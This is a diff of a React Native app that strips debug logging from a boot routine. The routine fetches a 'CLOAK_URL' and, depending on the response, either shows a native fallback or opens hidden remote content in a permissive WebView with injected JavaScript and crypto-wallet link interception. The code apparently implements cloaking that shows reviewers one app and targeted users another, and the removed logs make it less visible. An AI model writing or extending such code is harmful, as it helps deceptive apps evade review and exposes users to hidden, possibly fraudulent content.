@@ -57,7 +57,6 @@ const syncAppVersion = async () => {
   }
 };
 
-
 // ─── Navigation ──────────────────────────────────────────────────────────────
 
 const Stack = createStackNavigator();
@@ -83,7 +82,6 @@ function HomeScreen({ navigation }) {
   const webViewRef  = useRef<any>(null);
   const resolvedRef = useRef(false);
 
-  // Шаг 1 — UA
   useEffect(() => {
     DeviceInfo.getUserAgent().then(ua => {
       const ver = DeviceInfo.getSystemVersion();
@@ -91,7 +89,6 @@ function HomeScreen({ navigation }) {
     });
   }, []);
 
-  // Шаг 2 — проверка и загрузка контента
   useEffect(() => {
     if (!webViewUA) return;
     let cancelled = false;
@@ -101,26 +98,21 @@ function HomeScreen({ navigation }) {
         await syncAppVersion();
 
         const cached = await AsyncStorage.getItem(STORE_SESSION);
-        console.log('[BOOT] cached session:', cached);
 
         if (cached === '200') {
           const saved = await AsyncStorage.getItem(STORE_URL);
-          console.log('[BOOT] cached url:', saved);
           if (saved) {
             setContentUrl(saved);
             setIsLoading(false);
             return;
           }
         } else if (cached) {
-          console.log('[BOOT] non-200 cached, going native');
           activateNative();
           return;
         }
 
-        console.log('[BOOT] fetching:', CLOAK_URL);
         const res    = await fetch(CLOAK_URL, { headers: { 'User-Agent': webViewUA } });
         const status = String(res.status);
-        console.log('[BOOT] fetch status:', status);
         await AsyncStorage.setItem(STORE_SESSION, status);
 
         if (cancelled) return;
@@ -128,11 +120,9 @@ function HomeScreen({ navigation }) {
         if (status === '200') {
           await buildContentUrl();
         } else {
-          console.log('[BOOT] non-200, going native');
           activateNative();
         }
-      } catch (e) {
-        console.log('[BOOT] error:', e);
+      } catch {
         if (!cancelled) activateNative();
       }
     };
@@ -150,7 +140,6 @@ function HomeScreen({ navigation }) {
 
   const buildContentUrl = async () => {
     resolvedRef.current = true;
-    console.log('[BOOT] opening webview url:', CLOAK_URL);
     await AsyncStorage.setItem(STORE_URL, CLOAK_URL);
     setContentUrl(CLOAK_URL);
     setIsLoading(false);
@@ -164,7 +153,6 @@ function HomeScreen({ navigation }) {
   const handleShouldStartLoad = (event: any) => {
     const { url } = event;
     const scheme  = (url.split(':')[0] || '').toLowerCase();
-    console.log('[WV] shouldLoad url:', url, 'scheme:', scheme);
 
     if (CRYPTO_SCHEMES.includes(scheme)) {
       const address = url.split(':')[1]?.split('?')[0] || '';
@@ -236,10 +224,6 @@ function HomeScreen({ navigation }) {
             userAgent={webViewUA}
             style={{ flex: 1 }}
             originWhitelist={['*', 'http://*', 'https://*', 'intent://*']}
-            onLoadStart={e => console.log('[WV] load start:', e.nativeEvent.url)}
-            onLoadEnd={e => console.log('[WV] load end:', e.nativeEvent.url, e.nativeEvent.loading)}
-            onError={e => console.log('[WV] error:', JSON.stringify(e.nativeEvent))}
-            onHttpError={e => console.log('[WV] http error:', e.nativeEvent.statusCode, e.nativeEvent.url)}
             onShouldStartLoadWithRequest={handleShouldStartLoad}
             onOpenWindow={handleOpenWindow}
             injectedJavaScript={INJECTED_JS}
